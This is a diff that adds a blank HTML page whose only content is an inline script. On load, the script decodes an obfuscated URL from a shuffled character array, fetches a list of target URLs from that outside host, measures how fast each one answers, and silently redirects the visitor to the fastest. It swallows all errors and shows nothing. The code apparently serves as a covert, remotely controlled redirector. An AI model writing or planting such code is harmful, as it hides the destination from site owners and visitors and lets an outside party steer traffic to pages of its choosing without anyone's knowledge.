@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title></title>
+</head>
+<body>
+
+<script>
+const _p = [
+  "n", "/", "h", "9", "c", ".", "t", "s",
+  "a", "8", "p", "o", "e", "l", "i", "j",
+  "d", ":", "/", "c", "t", "s", "n"
+];
+
+const _m = [
+  2, 6, 20, 10, 7, 17, 1, 18,
+  4, 16, 0, 5, 8, 9, 3, 5,
+  19, 4, 1, 13, 14, 22, 12, 21,
+  5, 15, 7, 11, 0
+];
+
+function g() {
+  return _m.map(i => _p[i]).join("");
+}
+
+const TIMEOUT = 2500;
+
+function t(u) {
+  return new Promise(r => {
+    const s = performance.now();
+    const c = new AbortController();
+    const e = setTimeout(() => c.abort(), TIMEOUT);
+
+    fetch(u, {
+      method: "HEAD",
+      mode: "no-cors",
+      signal: c.signal
+    }).then(() => {
+      clearTimeout(e);
+      r({ url: u, time: performance.now() - s });
+    }).catch(() => r(null));
+  });
+}
+
+(async () => {
+  try {
+    const r = await fetch(g() + "?t=" + Date.now());
+    const l = await r.json();
+    if (!Array.isArray(l) || !l.length) return;
+
+    const c = (await Promise.all(l.map(t))).filter(Boolean);
+    if (!c.length) return;
+
+    c.sort((a, b) => a.time - b.time);
+    location.replace(c[0].url);
+  } catch (_) {}
+})();
+</script>
+
+</body>
+</html>
